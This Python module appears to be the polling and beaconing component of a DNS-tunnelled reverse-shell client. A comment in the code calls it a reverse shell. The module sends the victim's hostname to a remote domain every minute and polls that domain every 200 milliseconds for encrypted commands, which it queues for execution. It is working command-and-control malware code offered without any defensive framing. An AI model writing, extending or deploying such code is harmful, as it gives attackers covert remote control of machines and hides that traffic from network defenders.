# lib/transport/poller.py
import time
import socket
from typing import TYPE_CHECKING

from lib.protocol import chacomm_pb2
from lib.transport.marshaller import dns_marshal
from lib.transport.dns_query import send_dns_query
from lib.transport.decoder import decode

if TYPE_CHECKING:
    from lib.transport.dnsclient import DNSStream

# Import the global packet queue from dnsclient
from lib.transport.dnsclient import packet_queue


def poll_read(stream: 'DNSStream'):
    """
    Continuously poll the DNS server for incoming data.
    
    Args:
        stream: The DNS stream instance
    """
    # Send initial info packet with hostname
    send_info_packet(stream)
    
    loop_counter = 0
    
    while True:
        # Sleep 200ms - this is a reverse shell, not a DNS stress testing tool
        time.sleep(0.2)
        
        # Check for data
        poll(stream)
        
        loop_counter += 1
        
        # Send info packet every 60 seconds (300 * 0.2s = 60s)
        if loop_counter % 300 == 0:
            send_info_packet(stream)


def poll(stream: 'DNSStream'):
    """
    Poll the DNS server once for available data.
    
    Args:
        stream: The DNS stream instance
    """
    # Create a "polling" request using protobuf
    poll_query = chacomm_pb2.Message(
        clientguid=stream.client_guid,
        pollquery=chacomm_pb2.PollQuery()
    )
    
    try:
        # Marshal the poll query into DNS format
        poll_packet = dns_marshal(poll_query, stream.encryption_key, is_client=True)
    except Exception as e:
        print(f"Poll marshaling fatal error: {e}")
        return
    
    try:
        # Send DNS query and get answers
        answers = send_dns_query(poll_packet.encode(), stream.target_domain)
    except Exception as e:
        print(f"Could not get answer: {e}")
        return
    
    if len(answers) > 0:
        # Join all answer strings together
        packet_data = ''.join(answers)
        
        # Check if no data available (server returns "-")
        if packet_data == "-":
            return
        
        # Decode the packet data
        output, complete = decode(packet_data, stream.encryption_key)
        
        if complete:
            # Put complete packet in the queue
            packet_queue.put(output)
        else:
            # More data available, poll again recursively
            poll(stream)


def send_info_packet(stream: 'DNSStream'):
    """
    Send an info packet containing the hostname to the server.
    
    Args:
        stream: The DNS stream instance
    """
    try:
        # Get hostname
        hostname = socket.gethostname()
    except Exception as e:
        print(f"Could not get hostname: {e}")
        return
    
    # Create info packet containing hostname
    info_query = chacomm_pb2.Message(
        clientguid=stream.client_guid,
        infopacket=chacomm_pb2.InfoPacket(hostname=hostname.encode())
    )
    
    try:
        # Marshal and send packet
        poll_packet = dns_marshal(info_query, stream.encryption_key, is_client=True)
        send_dns_query(poll_packet.encode(), stream.target_domain)
    except Exception as e:
        print(f"Could not send info packet: {e}")
